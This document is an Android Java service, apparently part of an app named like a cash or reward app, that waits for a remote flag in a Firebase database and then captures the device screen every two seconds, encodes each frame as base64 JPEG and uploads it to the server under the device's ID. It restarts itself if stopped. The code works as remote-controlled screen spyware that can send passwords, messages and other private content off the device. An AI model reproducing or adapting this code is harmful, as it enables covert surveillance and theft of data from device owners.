package com.my.Refiner.Cash.User;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.HashMap;
import java.util.Map;

public class LiveScreenService extends Service {

    private static final String TAG = "LiveScreenService";
    private static final long INTERVAL = 2000;
    private static final int QUALITY = 40;

    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private int screenWidth, screenHeight, dpi;
    private int width, height;
    private String deviceId;
    private DatabaseReference dbRef;
    private Handler handler;
    private boolean isRunning = false;
    private ValueEventListener liveListener;
    private boolean liveEnabled = false;

    @Override
    public void onCreate() {
        super.onCreate();
        dbRef = FirebaseDatabase.getInstance().getReference();

        SharedPreferences prefs = getSharedPreferences("mdm", MODE_PRIVATE);
        deviceId = prefs.getString("device_id", null);
        if (deviceId == null || deviceId.equals("unknown")) {
            deviceId = Settings.Secure.getString(
                    getContentResolver(), Settings.Secure.ANDROID_ID);
            prefs.edit().putString("device_id", deviceId).apply();
        }

        handler = new Handler(Looper.getMainLooper());

        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        if (wm != null) wm.getDefaultDisplay().getMetrics(metrics);
        screenWidth = metrics.widthPixels;
        screenHeight = metrics.heightPixels;
        dpi = metrics.densityDpi;
        width = screenWidth / 2;
        height = screenHeight / 2;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!isRunning) {
            isRunning = true;
            mediaProjection = ScreenCaptureService.sMediaProjection;
            listenForLiveCommand();
            startLoop();
        }
        return START_STICKY;
    }

    private void listenForLiveCommand() {
        liveListener = new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                Boolean live = snapshot.getValue(Boolean.class);
                liveEnabled = live != null && live;
                Log.d(TAG, "Live enabled: " + liveEnabled);
            }

            @Override
            public void onCancelled(DatabaseError error) {
                Log.e(TAG, "Firebase error: " + error.getMessage());
            }
        };

        dbRef.child("devices").child(deviceId).child("liveScreen")
                .addValueEventListener(liveListener);
    }

    private void startLoop() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (liveEnabled) {
                    captureAndSend();
                }
                if (isRunning) {
                    handler.postDelayed(this, INTERVAL);
                }
            }
        }, INTERVAL);
    }

    private void captureAndSend() {
        if (mediaProjection == null) {
            mediaProjection = ScreenCaptureService.sMediaProjection;
            if (mediaProjection == null) {
                Log.w(TAG, "No MediaProjection");
                return;
            }
        }

        try {
            if (imageReader != null) {
                imageReader.close();
            }

            imageReader = ImageReader.newInstance(width, height,
                    PixelFormat.RGBA_8888, 2);

            virtualDisplay = mediaProjection.createVirtualDisplay(
                    "LiveScreen",
                    width, height, dpi,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.getSurface(), null, null);

            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    try {
                        Image image = imageReader.acquireLatestImage();
                        if (image == null) return;

                        Image.Plane[] planes = image.getPlanes();
                        ByteBuffer buffer = planes[0].getBuffer();
                        int pixelStride = planes[0].getPixelStride();
                        int rowStride = planes[0].getRowStride();
                        int rowPadding = rowStride - pixelStride * width;

                        Bitmap bitmap = Bitmap.createBitmap(
                                width + rowPadding / pixelStride,
                                height, Bitmap.Config.ARGB_8888);
                        bitmap.copyPixelsFromBuffer(buffer);

                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        bitmap.compress(Bitmap.CompressFormat.JPEG, QUALITY, baos);
                        byte[] bytes = baos.toByteArray();
                        String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);

                        Map<String, Object> frame = new HashMap<>();
                        frame.put("data", base64);
                        frame.put("time", System.currentTimeMillis());
                        frame.put("w", width);
                        frame.put("h", height);

                        dbRef.child("devices").child(deviceId)
                                .child("liveFrame").setValue(frame);

                        image.close();
                        bitmap.recycle();

                        if (virtualDisplay != null) {
                            virtualDisplay.release();
                            virtualDisplay = null;
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Capture error: " + e.getMessage());
                    }
                }
            }, 500);
        } catch (Exception e) {
            Log.e(TAG, "Error: " + e.getMessage());
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
        if (liveListener != null) {
            dbRef.child("devices").child(deviceId).child("liveScreen")
                    .removeEventListener(liveListener);
        }
        if (virtualDisplay != null) virtualDisplay.release();
        if (imageReader != null) imageReader.close();
        handler.removeCallbacksAndMessages(null);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
